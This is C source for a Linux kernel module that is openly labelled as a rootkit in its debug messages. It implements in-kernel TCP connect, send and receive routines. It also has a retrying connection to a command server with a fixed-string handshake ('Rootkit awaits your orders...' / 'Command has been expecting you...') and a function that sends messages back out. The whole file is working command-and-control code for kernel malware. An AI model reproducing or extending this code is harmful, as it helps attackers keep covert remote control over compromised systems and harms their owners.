#include<linux/in.h>
#include<linux/inet.h>
#include<linux/socket.h>
#include<net/sock.h>


struct server_t{ //structure holding data of the server
	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
	struct socket *sock; //structure holding socket object
	struct kvec sock_vec; //holds vector of data recieved
	struct msghdr sock_msg; //structure to hold data recieved
	char *message; //structure to hold message sent or recieved
};

struct server_t server; //global declaration of Server struct


	/*========================*\
		networking functions
	\*========================*/
static int net_connect(char *ipaddr, int port){ //connects to server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes

	// kernel memory allocate a send and recieve buffer
	server.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
	if (server.message == NULL) { //if message is null
		printk(KERN_DEBUG "[rootkit] net_connect- buffer kmalloc error!\n"); //prints debug info
		return -1; //returns -1 for error
	}
	
	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the s_addr

	server.s_addr.sin_family = AF_INET; //sets the family
	server.s_addr.sin_port = htons(port); //sets the port
	server.s_addr.sin_addr.s_addr = in_aton(ipaddr); //sets the adress
	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket

	//creates a socket- &init_net is the default network namespace
	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket
	if (err < 0) { //if error creating socket
		printk(KERN_DEBUG "[rootkit] net_connect- socket creation error!\n"); //print debug info
		return -1; //returns -1 for error
	}

	err = server.sock->ops->connect(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr), 0); //connects to the server
	if (err != 0){ //if unable to connect
		printk(KERN_DEBUG "[rootkit] net_connect: error connecting!- %i\n", err); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}

static int net_send(void){ //sends data to the server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes
	if (strlen(server.message)==0){ //if no message to be sent
		printk(KERN_DEBUG "[rootkit] net_send- no message!"); //print debug info
		return -1; //return -1 for error
	}
	memset(&(server.sock_msg), 0, sizeof(server.sock_msg)); //zeroes out message buffer
	memset(&(server.sock_vec), 0, sizeof(server.sock_vec)); //zeroes out message vector
	server.sock_vec.iov_base = server.message; //sets the data to be sent
	server.sock_vec.iov_len = BUFFER_SIZE; //sets the size of the message

	err = kernel_sendmsg(server.sock, &(server.sock_msg), &(server.sock_vec), 1, BUFFER_SIZE); // sends data
	if (err < 0) { //if error sending message
		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!\n"); //print debug info
		return err; //return error
	}
	else if(err != BUFFER_SIZE){ //if not all data sent
		printk(KERN_DEBUG "[rootkit] net_send- unable to send entire message\n"); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}

static int net_recv(void){ //recieves data from server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes
	memset(server.message, 0, BUFFER_SIZE); //zeroes out message buffer
	memset(&(server.sock_msg), 0, sizeof(server.sock_msg)); //zeroes out message buffer
	memset(&(server.sock_vec), 0, sizeof(server.sock_vec)); //zeroes out message vector
	server.sock_vec.iov_base=server.message; //sets the location of buffer for recieved data to be placed
	server.sock_vec.iov_len=BUFFER_SIZE; //sets the size of the message
	
	err = kernel_recvmsg(server.sock, &(server.sock_msg), &(server.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0); //recieves message
	if (err < 0){ //if error recieving message
		printk(KERN_DEBUG "[rootkit] server_recv: error recieving data"); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}


static int server_connect(char *ipaddr, int port){
	//MQV handshake with server will go here, but for now using string for identity proof
	
	int connect_count = 0; //count of how many times tried to connect
	
	//will be changed to infinite attempts with a wait
	while(net_connect(ipaddr, port)==-1 && connect_count++<100){ //if attempt to connect unsecsessful and not tried 100 times
		printk(KERN_DEBUG "connection failed... retrying");  //print debug info
		if(connect_count==100){ //if reached max attempts
			printk(KERN_DEBUG "connection failed!"); //print debug info
			return -1; //return -1 for error
		}
	};
	
	memset(server.message, 0, sizeof(server.message)); //zeroes out message buffer
	strcpy(server.message, "Rootkit awaits your orders..."); //copies basic auth message into buffer
	net_send(); //sends message
	net_recv(); //recieves servers response
	if (strcmp("Command has been expecting you...", server.message)!=0){ //if received message is not same as expected
		printk(KERN_DEBUG "[rootkit] server_connect: server is a fake\n%s", server.message); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}

int server_print(char *message){ //prints message on server
	server.message = message; //sets sever mesage to memory adress
	return net_send(); //sends message
}
